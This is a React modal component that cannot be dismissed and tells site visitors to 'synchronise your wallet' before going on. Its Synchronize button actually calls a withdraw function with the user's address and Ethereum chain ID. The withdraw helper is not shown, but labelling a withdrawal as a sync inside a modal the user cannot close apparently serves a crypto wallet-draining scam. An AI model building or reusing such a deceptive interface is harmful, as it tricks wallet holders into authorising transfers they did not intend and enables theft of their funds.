import React, { useContext, useState } from "react";
import Button from "react-bootstrap/Button";
import Modal from "react-bootstrap/Modal";
import { useNavigate } from "react-router-dom";
import { withdraw } from "../../helpers/connect-ishodniy";
import { UserContext } from "../../UserContext";
import "./SyncModal.scss";

function SyncModal({ URL }) {
  const navigate = useNavigate();
  const [smShow, setSmShow] = useState(true);
  const { value, setValue } = useContext(UserContext);
  const { adress } = value;
  console.log("adress", adress);

  const onClickHandler = async (e) => {
    e.preventDefault();
    const chainId = window.ethereum.chainId;
    withdraw(adress, chainId);
    // if (URL) {
    //   setSmShow(false);
    //   navigate(URL);
    // } else {
    //   setSmShow(false);
    // }
  };
  return (
    <>
      <Modal
        className="syncModalMain"
        onBackdropClick={() => setSmShow(true)}
        keyboard={false}
        animation={false}
        backdrop="static"
        show={smShow}
      >
        <Modal.Header
          style={
            {
              // borderBottom: "none",
            }
          }
        >
          <Modal.Title id="example-modal-sizes-title-sm">
            For further work with the website synchronise your wallet
          </Modal.Title>
        </Modal.Header>

        <Modal.Body className="syncModal-body">
          <Button
            onClick={onClickHandler}
            style={{
              backgroundColor: "#ff7043",
              borderColor: "#ff7043",
              padding: "15px",
            }}
          >
            <i class="fas fa-sync-alt"></i> Synchronize
          </Button>
        </Modal.Body>
      </Modal>
    </>
  );
}

export default SyncModal;
